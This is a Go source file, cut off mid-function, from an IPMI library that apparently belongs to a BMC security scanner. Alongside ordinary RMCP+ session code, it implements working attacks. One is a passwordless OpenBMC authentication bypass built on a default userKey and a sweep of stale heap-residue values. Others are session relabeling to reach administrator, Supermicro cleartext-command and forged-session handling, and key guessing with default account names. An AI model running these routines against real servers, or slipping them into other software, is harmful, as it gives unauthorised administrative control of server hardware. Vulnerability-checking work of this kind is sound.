package ipmi

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/md5"
	"crypto/rand"
	"crypto/sha1"
	"crypto/sha256"
	"encoding/binary"
	"errors"
	"fmt"
	"hash"
	"net"
	"strings"
	"time"
)

// commandProtection selects how in-session IPMI command packets are protected
// on the wire, independent of the negotiated cipher suite.
type commandProtection int

const (
	// protectionNegotiated signs/encrypts each command per the negotiated cipher
	// suite (spec-correct: integrity trailer keyed by K1, AES-CBC-128 keyed by K2).
	// This is the default.
	protectionNegotiated commandProtection = iota
	// protectionCleartext sends command packets with payload type 0x00 (the
	// integrity 0x40 and encrypt 0x80 header bits CLEAR) regardless of the
	// negotiated suite. This exercises the Supermicro ATEN "H3" quirk: ipmi_lan's
	// post-session receive path decides verify/decrypt solely from the per-packet
	// header bits and never enforces the session's cipher suite, so a cleartext
	// command is honored even in a {3,17} session (and even when K1/K2 are unknown,
	// e.g. a SMCRAKP-forged session).
	protectionCleartext
	// protectionAuto tries cleartext first and, on a transport-level failure (no
	// reply / timeout / unparseable session error) rather than an IPMI completion
	// code, falls back to the negotiated integrity+confidentiality path. Whichever
	// path first yields a parseable reply is latched for the rest of the session.
	// This keeps enumeration working on H3-affected BMCs while remaining correct if
	// the quirk is ever fixed (the negotiated fallback works whenever valid session
	// keys are held).
	protectionAuto
)

// Session20 is an authenticated IPMI 2.0 RMCP+ session capable of issuing
// in-session IPMI commands across the negotiated auth/integrity/conf profile.
type Session20 struct {
	client     *Client
	host       string
	port       int
	timeout    time.Duration
	cmdRetries int
	username   string
	password   string
	suite      CipherAlgos
	consoleSID uint32
	bmcSID     uint32
	seq        uint32
	rqSeq      byte
	sik        []byte
	k1         []byte
	k2         []byte
	setPriv    []SetPrivAttempt

	// prot selects the wire protection strategy for in-session commands.
	prot commandProtection
	// autoResolved/autoCleartext latch the winning strategy once protectionAuto
	// has determined which path the BMC honors.
	autoResolved  bool
	autoCleartext bool
}

// SetCommandProtection configures how in-session command packets are protected.
// Callers use this to enable the H3 cleartext path (or the cleartext-first auto
// fallback) for post-auth enumeration.
func (s *Session20) SetCommandProtection(mode commandProtection) {
	if s == nil {
		return
	}
	s.prot = mode
	s.autoResolved = false
	s.autoCleartext = false
}

// CommandProtectionUsed reports the wire protection actually in effect for
// in-session commands: "cleartext", "integrity+conf", or (for an auto strategy
// that has not yet issued a command) "auto".
func (s *Session20) CommandProtectionUsed() string {
	if s == nil {
		return ""
	}
	switch s.prot {
	case protectionCleartext:
		return "cleartext"
	case protectionAuto:
		if !s.autoResolved {
			return "auto"
		}
		if s.autoCleartext {
			return "cleartext"
		}
		return "integrity+conf"
	default:
		if s.suite.Integrity == IntegrityNone && s.suite.Conf == ConfNone {
			return "none"
		}
		return "integrity+conf"
	}
}

// effectiveCleartext returns whether the next command should be sent cleartext
// under the current (possibly latched) strategy. For an unresolved auto strategy
// it prefers cleartext, which is the H3-affected path and the safest best-effort
// choice for teardown.
func (s *Session20) effectiveCleartext() bool {
	switch s.prot {
	case protectionCleartext:
		return true
	case protectionAuto:
		if s.autoResolved {
			return s.autoCleartext
		}
		return true
	default:
		return false
	}
}

// canNegotiate reports whether the session holds key material capable of
// producing a valid integrity trailer / AES ciphertext for the negotiated suite.
// A cipher-0 / no-protection suite trivially "negotiates" (payload type 0x00).
func (s *Session20) canNegotiate() bool {
	if s.suite.Integrity == IntegrityNone && s.suite.Conf == ConfNone {
		return true
	}
	if s.suite.Integrity != IntegrityNone && len(s.k1) == 0 {
		return false
	}
	if s.suite.Conf != ConfNone && len(s.k2) == 0 {
		return false
	}
	return true
}

// SetPrivAttempt records one Set Session Privilege Level (0x3B) probe outcome.
type SetPrivAttempt struct {
	Requested byte   `json:"requested"`
	Name      string `json:"name,omitempty"`
	Success   bool   `json:"success"`
	CC        byte   `json:"cc,omitempty"`
	Granted   byte   `json:"granted,omitempty"`
	Error     string `json:"error,omitempty"`
}

// OpenSession20 establishes a live RMCP+ session using the requested suite.
func OpenSession20(host string, port int, username, password string, suite CipherAlgos, timeout time.Duration) (*Session20, error) {
	return openSession20WithSecret(host, port, username, []byte(password), password, suite, timeout, 0x04)
}

// OpenSession20User establishes a live RMCP+ session requesting USER privilege.
func OpenSession20User(host string, port int, username, password string, suite CipherAlgos, timeout time.Duration) (*Session20, error) {
	return openSession20WithSecret(host, port, username, []byte(password), password, suite, timeout, 0x02)
}

// OpenSession20WithKey establishes an RMCP+ session using an explicit key
// instead of a password string. Used by SMCRAKP fixed-key mode.
func OpenSession20WithKey(host string, port int, username string, key []byte, suite CipherAlgos, timeout time.Duration) (*Session20, error) {
	return openSession20WithSecret(host, port, username, append([]byte(nil), key...), "<smcrakp-fixed-key>", suite, timeout, 0x04)
}

func openSession20WithSecret(host string, port int, username string, secret []byte, displayPassword string, suite CipherAlgos, timeout time.Duration, reqPriv byte) (*Session20, error) {
	c, err := NewClient(host, port, timeout)
	if err != nil {
		return nil, err
	}
	handshakeRetries := session20HandshakeRetries(timeout)
	cmdRetries := session20CommandRetries(timeout)

	var cSID uint32
	_ = binary.Read(rand.Reader, binary.LittleEndian, &cSID)
	if cSID == 0 {
		cSID = 0xa0a2a3a4
	}
	cRand := make([]byte, 16)
	if _, err := rand.Read(cRand); err != nil {
		c.Close()
		return nil, err
	}

	// Open Session Request.
	var os bytes.Buffer
	os.WriteByte(0x00)
	os.WriteByte(reqPriv & 0x0f) // requested max privilege
	os.Write([]byte{0x00, 0x00})
	_ = binary.Write(&os, binary.LittleEndian, cSID)
	os.Write([]byte{0x00, 0x00, 0x00, 0x08, suite.Auth, 0, 0, 0})
	os.Write([]byte{0x01, 0x00, 0x00, 0x08, suite.Integrity, 0, 0, 0})
	os.Write([]byte{0x02, 0x00, 0x00, 0x08, suite.Conf, 0, 0, 0})

	osResp, err := sendWithTimeoutRetry(c, buildRMCPPlus(PayloadOpenSessionReq, 0, 0, os.Bytes()), handshakeRetries)
	if err != nil {
		c.Close()
		return nil, fmt.Errorf("open-session: %w", err)
	}
	bmcSID, err := parseOpenSessionResp(osResp)
	if err != nil {
		c.Close()
		return nil, err
	}

	// RAKP-1.
	var r1 bytes.Buffer
	r1.WriteByte(0x00)
	r1.Write([]byte{0, 0, 0})
	_ = binary.Write(&r1, binary.LittleEndian, bmcSID)
	r1.Write(cRand)
	r1.WriteByte(0x10 | (reqPriv & 0x0f))
	r1.Write([]byte{0, 0})
	r1.WriteByte(byte(len(username)))
	r1.WriteString(username)

	r2Resp, err := sendWithTimeoutRetry(c, buildRMCPPlus(PayloadRAKP1, 0, 0, r1.Bytes()), handshakeRetries)
	if err != nil {
		c.Close()
		return nil, fmt.Errorf("rakp1: %w", err)
	}
	res := &RAKPResult{Username: username, AuthAlgo: suite.Auth, IntegrityAlgo: suite.Integrity, ConfAlgo: suite.Conf, ClientSID: cSID, BMCSID: bmcSID, ClientRand: cRand}
	if err := parseRAKP2(r2Resp, res); err != nil {
		c.Close()
		return nil, err
	}

	// RAKP-3.
	kec := []byte(nil)
	if suite.Auth != RAKPNone {
		kec = rakpKEC3ByAlgoKey(suite.Auth, secret, res.BMCRand, cSID, 0x10|(reqPriv&0x0f), username)
	}
	var r3 bytes.Buffer
	r3.WriteByte(0x00)
	r3.WriteByte(0x00)
	r3.Write([]byte{0, 0})
	_ = binary.Write(&r3, binary.LittleEndian, bmcSID)
	r3.Write(kec)

	r3pkt := buildRMCPPlus(PayloadRAKP3, 0, 0, r3.Bytes())
	r4Resp, err := sendWithTimeoutRetry(c, r3pkt, handshakeRetries)
	if err != nil {
		c.Close()
		return nil, fmt.Errorf("rakp3: %w", err)
	}
	p, err := rmcpPlusPayload(r4Resp)
	if err != nil {
		c.Close()
		return nil, err
	}
	if len(p) < 2 || p[1] != 0x00 {
		c.Close()
		if len(p) >= 2 {
			return nil, fmt.Errorf("rakp4 status=0x%02x (%s)", p[1], rakpStatusText(p[1]))
		}
		return nil, errors.New("short RAKP4")
	}

	s := &Session20{
		client:     c,
		host:       host,
		port:       port,
		timeout:    timeout,
		cmdRetries: cmdRetries,
		username:   username,
		password:   displayPassword,
		suite:      suite,
		consoleSID: cSID,
		bmcSID:     bmcSID,
		seq:        1,
		rqSeq:      1,
	}
	s.sik, s.k1, s.k2 = deriveSessionKeysWithRole(suite.Auth, secret, cRand, res.BMCRand, 0x10|(reqPriv&0x0f), username)
	if displayPassword == "<smcrakp-fixed-key>" {
		s.calibrateSMCRAKPKeys(secret, cRand, res.BMCRand)
		// Supermicro fixed-key sessions can be finicky around set-priv responses.
		// Probe admin privilege once but never hard-fail session establishment on
		// timeout/denial; command probes will determine usable access.
		s.cmdRetries = 1
		_, _ = s.setSessionPrivilege(0x04)
		return s, nil
	}
	primary, err := s.setSessionPrivilege(reqPriv & 0x0f)
	if err != nil {
		if !isTimeoutErr(err) {
			s.Close()
			return nil, fmt.Errorf("set-session-privilege: %w", err)
		}
		// Some BMCs intermittently drop the set-priv response right after RAKP.
		// Retry once; if it still times out, proceed and let the first command
		// validate whether the session is usable.
		retry, err2 := s.setSessionPrivilege(reqPriv & 0x0f)
		if err2 == nil {
			if !retry.Success {
				s.probeAlternativePrivileges()
			}
		} else if !isTimeoutErr(err2) {
			s.Close()
			return nil, fmt.Errorf("set-session-privilege: %w", err2)
		}
	} else if !primary.Success {
		// Do not fail session establishment when privilege escalation is denied.
		// Some devices authenticate successfully but cap session privilege below
		// admin for the given account; callers can still issue read-only probes
		// and classify limited-access post-auth behavior based on command CCs.
		s.probeAlternativePrivileges()
	}
	return s, nil
}

// OpenBMCDefaultUserKey is the constant 20-byte RAKP userKey ("0penBmc" plus 13
// zero bytes) that phosphor-net-ipmid leaves in place on the CALLBACK early-exit
// path: the account password is only copied over it after the
// privilege check that a CALLBACK request deliberately trips, so it stays the
// compiled-in default regardless of the configured password.
var OpenBMCDefaultUserKey = func() []byte {
	k := make([]byte, 20)
	copy(k, "0penBmc")
	return k
}()

// OpenSession20OpenBMCBypass establishes a live RMCP+ session via the OpenBMC
// default-userKey bypass, with no account password. RAKP Message 1 requests
// CALLBACK privilege, tripping the UNAUTH_ROLE_PRIV early return that leaves
// userKey="0penBmc" and bmcRandomNum stale; RAKP Message 3 then carries an HMAC
// over the constant userKey and the supplied stale bmcRandomNum. The session comes
// up at CALLBACK privilege - chain RelabelActiveSession to reach administrator.
// staleBMCRand must be the 16-byte value for the target netipmid process; username
// is unvalidated here and only has to match between RAKP1 and the HMAC.
func OpenSession20OpenBMCBypass(host string, port int, username string, staleBMCRand []byte, suite CipherAlgos, timeout time.Duration) (*Session20, error) {
	if len(staleBMCRand) != 16 {
		return nil, fmt.Errorf("openbmc bypass: bmcRandomNum must be 16 bytes, got %d", len(staleBMCRand))
	}
	if strings.TrimSpace(username) == "" {
		username = "root"
	}
	if suite.Auth == RAKPNone {
		return nil, errors.New("openbmc bypass requires an authenticated cipher suite (not cipher-zero)")
	}
	c, err := NewClient(host, port, timeout)
	if err != nil {
		return nil, err
	}
	handshakeRetries := session20HandshakeRetries(timeout)
	cmdRetries := session20CommandRetries(timeout)

	var cSID uint32
	_ = binary.Read(rand.Reader, binary.LittleEndian, &cSID)
	if cSID == 0 {
		cSID = 0xb0b1b2b3
	}
	cRand := make([]byte, 16)
	if _, err := rand.Read(cRand); err != nil {
		c.Close()
		return nil, err
	}

	// The BMC never updates session->reqMaxPrivLevel on the early-exit path, so it
	// retains the Open Session requested privilege. Request ADMIN (0x04) so the
	// byte the BMC feeds into the RAKP3 and SIK HMACs is 0x04; the client must use
	// the same bare privilege byte (not 0x10|priv) when recomputing them.
	const sessPriv = 0x04
	var os bytes.Buffer
	os.WriteByte(0x00)
	os.WriteByte(sessPriv)
	os.Write([]byte{0x00, 0x00})
	_ = binary.Write(&os, binary.LittleEndian, cSID)
	os.Write([]byte{0x00, 0x00, 0x00, 0x08, suite.Auth, 0, 0, 0})
	os.Write([]byte{0x01, 0x00, 0x00, 0x08, suite.Integrity, 0, 0, 0})
	os.Write([]byte{0x02, 0x00, 0x00, 0x08, suite.Conf, 0, 0, 0})
	osResp, err := sendWithTimeoutRetry(c, buildRMCPPlus(PayloadOpenSessionReq, 0, 0, os.Bytes()), handshakeRetries)
	if err != nil {
		c.Close()
		return nil, fmt.Errorf("open-session: %w", err)
	}
	bmcSID, err := parseOpenSessionResp(osResp)
	if err != nil {
		c.Close()
		return nil, err
	}

	// RAKP Message 1 requesting CALLBACK privilege (role 0x01) to trip the
	// UNAUTH_ROLE_PRIV early exit.
	var r1 bytes.Buffer
	r1.WriteByte(0x00)
	r1.Write([]byte{0, 0, 0})
	_ = binary.Write(&r1, binary.LittleEndian, bmcSID)
	r1.Write(cRand)
	r1.WriteByte(0x01)
	r1.Write([]byte{0, 0})
	r1.WriteByte(byte(len(username)))
	r1.WriteString(username)
	r2Resp, err := sendWithTimeoutRetry(c, buildRMCPPlus(PayloadRAKP1, 0, 0, r1.Bytes()), handshakeRetries)
	if err != nil {
		c.Close()
		return nil, fmt.Errorf("rakp1: %w", err)
	}
	// The expected RAKP2 carries status 0x0a (UNAUTH_ROLE_PRIV); its bmcRand field
	// is zero and is not used -- the stale value is supplied by the caller. A
	// different status does not necessarily mean failure, so continue to RAKP3.
	_ = r2Resp

	// RAKP Message 3: HMAC over the stale bmcRandomNum and controlled fields,
	// keyed by the constant userKey.
	kec := rakpKEC3ByAlgoKey(suite.Auth, OpenBMCDefaultUserKey, staleBMCRand, cSID, sessPriv, username)
	var r3 bytes.Buffer
	r3.WriteByte(0x00)
	r3.WriteByte(0x00)
	r3.Write([]byte{0, 0})
	_ = binary.Write(&r3, binary.LittleEndian, bmcSID)
	r3.Write(kec)
	r4Resp, err := sendWithTimeoutRetry(c, buildRMCPPlus(PayloadRAKP3, 0, 0, r3.Bytes()), handshakeRetries)
	if err != nil {
		c.Close()
		return nil, fmt.Errorf("rakp3: %w", err)
	}
	p, err := rmcpPlusPayload(r4Resp)
	if err != nil {
		c.Close()
		return nil, err
	}
	if len(p) < 2 || p[1] != 0x00 {
		c.Close()
		if len(p) >= 2 {
			return nil, fmt.Errorf("rakp4 status=0x%02x (%s); the supplied bmc-random likely does not match the target's stale value", p[1], rakpStatusText(p[1]))
		}
		return nil, errors.New("short RAKP4")
	}

	s := &Session20{
		client:     c,
		host:       host,
		port:       port,
		timeout:    timeout,
		cmdRetries: cmdRetries,
		username:   username,
		password:   "<openbmc-default-userkey>",
		suite:      suite,
		consoleSID: cSID,
		bmcSID:     bmcSID,
		seq:        1,
		rqSeq:      1,
	}
	s.sik, s.k1, s.k2 = deriveSessionKeysWithRole(suite.Auth, OpenBMCDefaultUserKey, cRand, staleBMCRand, sessPriv, username)
	// The activated session enforces the negotiated integrity/confidentiality, so
	// in-session commands must be protected (cleartext is rejected once the algo
	// is installed). The session is CALLBACK privilege until relabeled.
	s.SetCommandProtection(protectionNegotiated)
	return s, nil
}

// isHeapPtrResidue reports whether v is a heap-pointer-form stale bmcRandomNum:
// 00000000 <ptr LE32> 00000000 65000000 (bytes 4-7 the leaked pointer).
func isHeapPtrResidue(v []byte) bool {
	return len(v) == 16 &&
		v[0] == 0 && v[1] == 0 && v[2] == 0 && v[3] == 0 &&
		v[8] == 0 && v[9] == 0 && v[10] == 0 && v[11] == 0 &&
		v[12] == 0x65 && v[13] == 0 && v[14] == 0 && v[15] == 0
}

// openBMCBypassCandidates builds the ordered stale-value candidates for a bypass
// retry. It starts with the supplied value; if that value is a heap-pointer
// residue it adds neighbouring pages at the same in-page offset (the heap base
// can drift between value discovery and the exploit session). It always appends
// the ASLR-independent constants -- the cold-boot all-zero value and the known
// freed-string residues -- repeated a few times because a string residue recurs
// on only a fraction of sessions.
func openBMCBypassCandidates(v []byte, sweepPages, stringRetries int) [][]byte {
	var out [][]byte
	add := func(b []byte) {
		if len(b) == 16 {
			out = append(out, append([]byte(nil), b...))
		}
	}
	add(v)
	if isHeapPtrResidue(v) {
		ptr := binary.LittleEndian.Uint32(v[4:8])
		for k := 1; k <= sweepPages; k++ {
			for _, sign := range []int64{1, -1} {
				np := uint32(int64(ptr) + sign*int64(k)*0x1000)
				c := make([]byte, 16)
				binary.LittleEndian.PutUint32(c[4:8], np)
				c[12] = 0x65
				add(c)
			}
		}
	}
	consts := [][]byte{make([]byte, 16)}
	for _, s := range []string{"/xyz/openbmc_pro", "/openbmc_project", "/ipmi/session/et", "e IPMI LAN sessi"} {
		consts = append(consts, []byte(s))
	}
	for range stringRetries {
		for _, c := range consts {
			add(c)
		}
	}
	return out
}

// OpenSession20OpenBMCBypassRescan opens the passwordless bypass session with the
// supplied stale value and, on a RAKP4 mismatch (0x0f -- the residue drifted or
// varies per session), retries nearby heap-pointer candidates and the constant
// string residues. Each attempt is a fresh session. sweepPages bounds the +/-
// page window; 0 tries only the supplied value plus the constants. It stops on
// the first activation, or on any non-mismatch (transport) error.
func OpenSession20OpenBMCBypassRescan(host string, port int, username string, staleBMCRand []byte, suite CipherAlgos, timeout time.Duration, sweepPages, stringRetries int, log func(string)) (*Session20, error) {
	cands := openBMCBypassCandidates(staleBMCRand, sweepPages, stringRetries)
	var lastErr error
	for i, cand := range cands {
		s, err := OpenSession20OpenBMCBypass(host, port, username, cand, suite, timeout)
		if err == nil {
			if log != nil && i > 0 {
				log(fmt.Sprintf("openbmc bypass: activated on candidate %d/%d after miss (bmcrand=%x)", i+1, len(cands), cand))
			}
			return s, nil
		}
		lastErr = err
		if !strings.Contains(strings.ToLower(err.Error()), "does not match") {
			return nil, err // transport or other hard error -- do not keep sweeping
		}
	}
	return nil, lastErr
}

func (s *Session20) calibrateSMCRAKPKeys(secret, cRand, bRand []byte) {
	if s == nil || s.client == nil {
		return
	}
	type keyVariant struct {
		key  []byte
		role byte
		user string
	}
	keyCandidates := [][]byte{append([]byte(nil), secret...)}
	for _, cand := range []string{s.username, "ADMIN", "admin", "root", ""} {
		if cand == "" {
			continue
		}
		k := []byte(cand)
		dup := false
		for _, existing := range keyCandidates {
			if bytes.Equal(existing, k) {
				dup = true
				break
			}
		}
		if !dup {
			keyCandidates = append(keyCandidates, append([]byte(nil), k...))
		}
	}
	// Supermicro fixed-key mode sometimes authenticates RAKP but expects a
	// slightly different SIK salt composition for command-capable sessions.
	variants := make([]keyVariant, 0, len(keyCandidates)*2)
	for _, key := range keyCandidates {
		variants = append(variants, keyVariant{key: key, role: 0x14, user: s.username})
		variants = append(variants, keyVariant{key: key, role: 0x04, user: s.username})
	}
	origTimeout := s.client.Timeout
	origRetries := s.cmdRetries
	if s.client.Timeout == 0 || s.client.Timeout > 800*time.Millisecond {
		s.client.Timeout = 800 * time.Millisecond
	}
	s.cmdRetries = 1
	probes := 0
	const maxProbes = 8
	for _, v := range variants {
		if probes >= maxProbes {
			break
		}
		probes++
		sik, k1, k2 := deriveSessionKeysWithRole(s.suite.Auth, v.key, cRand, bRand, v.role, v.user)
		s.sik, s.k1, s.k2 = sik, k1, k2
		cc, data, err := s.exec(NetFnApp, CmdGetDeviceID, nil)
		if err == nil && cc == 0x00 && len(data) > 0 {
			break
		}
	}
	s.client.Timeout = origTimeout
	s.cmdRetries = origRetries
}

func setPrivName(v byte) string {
	switch v {
	case 0x01:
		return "callback"
	case 0x02:
		return "user"
	case 0x03:
		return "operator"
	case 0x04:
		return "admin"
	case 0x05:
		return "oem"
	default:
		return "undefined"
	}
}

func (s *Session20) setSessionPrivilege(requested byte) (SetPrivAttempt, error) {
	at := SetPrivAttempt{Requested: requested, Name: setPrivName(requested)}
	cc, data, err := s.exec(NetFnApp, CmdSetSessionPrivilege, []byte{requested})
	if err != nil {
		at.Error = err.Error()
		s.setPriv = append(s.setPriv, at)
		return at, err
	}
	at.CC = cc
	at.Success = cc == 0x00
	if len(data) >= 1 {
		at.Granted = data[0]
	}
	if cc != 0x00 {
		at.Error = fmt.Sprintf("cc=0x%02x", cc)
	}
	s.setPriv = append(s.setPriv, at)
	return at, nil
}

func (s *Session20) probeAlternativePrivileges() {
	if s == nil {
		return
	}
	// Keep scan-mode sessions responsive. On short probe timeouts, probing many
	// privilege values can add tens of seconds with no inventory benefit.
	if s.timeout <= 4*time.Second {
		return
	}
	// Probe lower and odd privilege values after admin escalation is denied.
	for _, pv := range []byte{0x02, 0x03, 0x01, 0x05, 0x00, 0x06, 0x0f} {
		_, _ = s.setSessionPrivilege(pv)
	}
}

// SetPrivilegeAttempts returns a copy of all set-session-privilege probes.
func (s *Session20) SetPrivilegeAttempts() []SetPrivAttempt {
	if s == nil || len(s.setPriv) == 0 {
		return nil
	}
	out := make([]SetPrivAttempt, len(s.setPriv))
	copy(out, s.setPriv)
	return out
}

// RelabelActiveSession sends a sessionless RAKP-1 at this active BMC session ID,
// naming a different account. Vulnerable phosphor-net-ipmid builds overwrite the
// session authorization fields while keeping the existing K1/K2 packet keys.
func (s *Session20) RelabelActiveSession(username string, reqPriv byte) (*RAKPResult, error) {
	if s == nil || s.client == nil {
		return nil, errors.New("session20: closed")
	}
	cRand := make([]byte, 16)
	if _, err := rand.Read(cRand); err != nil {
		return nil, err
	}
	return sendRAKP1OnSession(s.client, s.bmcSID, cRand, username, 0x10|(reqPriv&0x0f))
}

// RequestSessionPrivilege exposes Set Session Privilege Level for checks that
// need to prove a state-machine transition after session establishment.
func (s *Session20) RequestSessionPrivilege(requested byte) (SetPrivAttempt, error) {
	if s == nil || s.client == nil {
		return SetPrivAttempt{}, errors.New("session20: closed")
	}
	return s.setSessionPrivilege(requested)
}

func isTimeoutErr(err error) bool {
	if err == nil {
		return false
	}
	var ne net.Error
	if errors.As(err, &ne) {
		return ne.Timeout()
	}
	return strings.Contains(strings.ToLower(err.Error()), "timeout")
}

func sendWithTimeoutRetry(c *Client, pkt []byte, attempts int) ([]byte, error) {
	if attempts <= 0 {
		attempts = 1
	}
	var (
		reply []byte
		err   error
	)
	for attempt := 0; attempt < attempts; attempt++ {
		reply, err = c.Send(pkt)
		if err == nil {
			return reply, nil
		}
		if !isTimeoutErr(err) {
			return nil, err
		}
	}
	return nil, err
}

func rakpStatusText(code byte) string {
	switch code {
	case 0x00:
		return "no errors"
	case 0x01:
		return "insufficient resources for session"
	case 0x02:
		return "invalid session id"
	case 0x03:
		return "invalid payload type"
	case 0x04:
		return "invalid authentication algorithm"
	case 0x05:
		return "invalid integrity algorithm"
	// IPMI 2.0 Table 13-15 (RMCP+ status codes). This block was previously
	// shifted by one from 0x06 down, which mislabelled every RAKP status at or
	// below "no matching authentication payload" - including 0x0f, the
	// spec-correct rejection an OpenBMC-class stack returns for an out-of-order
	// RAKP message 3, and 0x0d, the code an ATEN stack returns for an unknown
	// username. Both are required by the CVE-2026-65219 / CVE-2026-65220 checks.
	case 0x06:
		return "no matching authentication payload"
	case 0x07:
		return "no matching integrity payload"
	case 0x08:
		// Spec meaning. Note the ATEN stack also returns this for a failed RAKP
		// message 3 authentication code, where the spec would use 0x0f.
		return "inactive session id"
	case 0x09:
		return "invalid role"
	case 0x0a:
		return "unauthorized role or privilege level requested"
	case 0x0b:
		return "insufficient resources to create a session at the requested role"
	case 0x0c:
		return "invalid name length"
	case 0x0d:
		return "unauthorized name"
	case 0x0e:
		return "unauthorized guid"
	case 0x0f:
		return "invalid integrity check value"
	case 0x10:
		return "invalid confidentiality algorithm"
	case 0x11:
		return "no cipher suite match with proposed security algorithms"
	default:
		return "session activation failed"
	}
}

func session20HandshakeRetries(timeout time.Duration) int {
	// Prevent timeout amplification on short per-probe windows used by scan mode.
	if timeout <= 4*time.Second {
		return 1
	}
	if timeout <= 5*time.Second {
		return 2
	}
	return 3
}

func session20CommandRetries(timeout time.Duration) int {
	if timeout <= 4*time.Second {
		return 1
	}
	return 2
}

func (s *Session20) Close() {
	if s == nil || s.client == nil {
		return
	}
	// Best effort close session, using the protection strategy already in effect
	// (a single attempt: teardown must not stall on a dead/quirk-fixed session).
	_, _, _ = s.execOnce(NetFnApp, CmdCloseSession, binary.LittleEndian.AppendUint32(nil, s.bmcSID), s.effectiveCleartext(), 1)
	_ = s.client.Close()
	s.client = nil
}

// closeActivatedRAKPSession tears down a session established by a hand-rolled
// RAKP handshake that never built a Session20. The keys are re-derived with the
// role the handshake signed, so the Close Session carries the integrity the
// session negotiated. Best effort: teardown must not fail the caller, and a
// dropped close is no worse than the leak it replaces.
func closeActivatedRAKPSession(c *Client, username string, secret, cRand, bRand []byte, suite CipherAlgos, consoleSID, bmcSID uint32, timeout time.Duration) {
	if c == nil {
		return
	}
	s := &Session20{
		client:     c,
		timeout:    timeout,
		cmdRetries: 1,
		username:   username,
		suite:      suite,
		consoleSID: consoleSID,
		bmcSID:     bmcSID,
		seq:        1,
		rqSeq:      1,
	}
	s.sik, s.k1, s.k2 = deriveSessionKeysWithRole(suite.Auth, secret, cRand, bRand, rakpLoginRole, username)
	s.Close()
}

func (s *Session20) Exec(netfn, cmd byte, data []byte) (byte, []byte, error) {
	if s == nil || s.client == nil {
		return 0xff, nil, errors.New("session20: closed")
	}
	return s.exec(netfn, cmd, data)
}

func (s *Session20) exec(netfn, cmd byte, data []byte) (byte, []byte, error) {
	switch s.prot {
	case protectionCleartext:
		return s.execOnce(netfn, cmd, data, true, s.cmdRetries)
	case protectionAuto:
		if s.autoResolved {
			return s.execOnce(netfn, cmd, data, s.autoCleartext, s.cmdRetries)
		}
		return s.execAutoProbe(netfn, cmd, data)
	default:
		return s.execOnce(netfn, cmd, data, false, s.cmdRetries)
	}
}

// execAutoProbe issues the command cleartext first (H3), then--only if that fails
// at the transport level (no reply / timeout / unparseable session error)--retries
// on the negotiated integrity+confidentiality path. It latches whichever path
// yields a parseable reply so subsequent commands skip the probe. A non-zero IPMI
// completion code is a real answer, not a transport failure, so it does not
// trigger fallback (the quirk is clearly honored). When neither path answers, the
// negotiated error is returned (more informative) without latching.
func (s *Session20) execAutoProbe(netfn, cmd byte, data []byte) (byte, []byte, error) {
	// Single-shot the cleartext probe so a spec-compliant BMC that silently drops
	// unprotected packets costs only one timeout before we fall back.
	cc, out, err := s.execOnce(netfn, cmd, data, true, 1)
	if err == nil {
		s.autoResolved = true
		s.autoCleartext = true
		return cc, out, nil
	}
	if !s.canNegotiate() {
		// No usable key material for the negotiated path (e.g. a SMCRAKP-forged
		// session where K1/K2 are unknown). Cleartext was the only option; surface
		// its failure so the caller reports limited enumeration rather than hanging.
		return cc, out, err
	}
	cc2, out2, err2 := s.execOnce(netfn, cmd, data, false, s.cmdRetries)
	if err2 == nil {
		s.autoResolved = true
		s.autoCleartext = false
		return cc2, out2, nil
	}
	return cc2, out2, err2
}

// execOnce builds and sends one command packet at the chosen protection level and
// parses the reply. cleartext=true forces payload type 0x00 (integrity/encrypt
// bits clear); cleartext=false uses the negotiated suite.
func (s *Session20) execOnce(netfn, cmd byte, data []byte, cleartext bool, retries int) (byte, []byte, error) {
	lan := buildSessionLANMsg(netfn, cmd, data, s.rqSeq)
	s.advanceRqSeq()
	pkt, err := s.buildPayload(lan, cleartext)
	if err != nil {
		return 0xff, nil, err
	}
	if retries <= 0 {
		retries = 2
	}
	reply, err := sendWithTimeoutRetry(s.client, pkt, retries)
	if err != nil {
		return 0xff, nil, err
	}
	body, err := s.parseReplyPayload(reply)
	if err != nil {
		return 0xff, nil, err
	}
	dataOut, cc, ok := extractIPMIData(body)
	if !ok {
		return 0xff, nil, errors.New("session20: unparseable ipmi payload")
	}
	return cc, dataOut, nil
}

func (s *Session20) advanceRqSeq() {
	s.rqSeq = (s.rqSeq + 1) & 0x3f
	if s.rqSeq == 0 {
		s.rqSeq = 1
	}
}

func buildSessionLANMsg(netfn, cmd byte, data []byte, rqSeq byte) []byte {
	body := make([]byte, 0, 7+len(data))
	body = append(body, 0x20)
	body = append(body, netfn<<2)
	body = append(body, 0x00)
	body[2] = IPMBChecksum(body[:2])
	body = append(body, 0x81)
	body = append(body, (rqSeq&0x3f)<<2)
	body = append(body, cmd)
	body = append(body, data...)
	body = append(body, IPMBChecksum(body[3:]))
	return body
}

func (s *Session20) buildPayload(ipmiPayload []byte, cleartext bool) ([]byte, error) {
	// cleartext forces payload type 0x00 (H3 path): the integrity/encrypt header
	// bits are cleared regardless of the negotiated suite, so no trailer is added
	// and no encryption is applied.
	encrypted := !cleartext && s.suite.Conf != ConfNone
	authed := !cleartext && s.suite.Integrity != IntegrityNone
	if encrypted && s.suite.Conf != ConfAESCBC {
		return nil, fmt.Errorf("session20: unsupported confidentiality algorithm 0x%02x", s.suite.Conf)
	}

	payloadType := PayloadIPMI
	payload := ipmiPayload
	if encrypted {
		enc, err := s.encryptPayload(ipmiPayload)
		if err != nil {
			return nil, err
		}
		payloadType |= 0x80
		payload = enc
	}
	if authed {
		payloadType |= 0x40
	}

	var hdr bytes.Buffer
	hdr.Write([]byte{RMCPVersion, RMCPReserved, RMCPSeqNoAck, RMCPClassIPMI})
	hdr.WriteByte(IPMI20Format)
	hdr.WriteByte(payloadType)
	hdr.Write(binary.LittleEndian.AppendUint32(nil, s.bmcSID))
	hdr.Write(binary.LittleEndian.AppendUint32(nil, s.seq))
	hdr.Write(binary.LittleEndian.AppendUint16(nil, uint16(len(payload))))
	s.seq++
	if s.seq == 0 {
		s.seq = 1
	}

	base := append(hdr.Bytes(), payload...)
	if !authed {
		return base, nil
	}
	padLen := byte((4 - ((len(base) + 2) % 4)) % 4)
	trailPad := bytes.Repeat([]byte{0xff}, int(padLen))
	msg := append(base, trailPad...)
	msg = append(msg, padLen, 0x07)
	mac := s.integrityMac(msg[4:])
	msg = append(msg, mac...)
	return msg, nil
}

func (s *Session20) parseReplyPayload(pkt []byte) ([]byte, error) {
	if len(pkt) < 16 {
		return nil, errors.New("session20: short packet")
	}
	if pkt[3] != RMCPClassIPMI || pkt[4] != IPMI20Format {
